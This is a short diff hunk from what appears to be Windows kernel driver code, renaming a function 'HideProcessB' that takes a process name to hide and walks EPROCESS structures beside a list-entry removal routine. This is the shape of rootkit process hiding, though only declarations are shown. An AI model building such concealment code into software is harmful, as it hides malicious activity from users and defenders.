@@ -43,7 +43,7 @@ RemoveListEntry(PLIST_ENTRY ListEntry)
     	KeLowerIrql(OldIrql);
 }
      
-BOOLEAN HideProcessB(PUCHAR pszHideProcessName)
+BOOLEAN Hiding(PUCHAR pszHideProcessName)
 {
     PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
     ULONG ulOffset = 0;
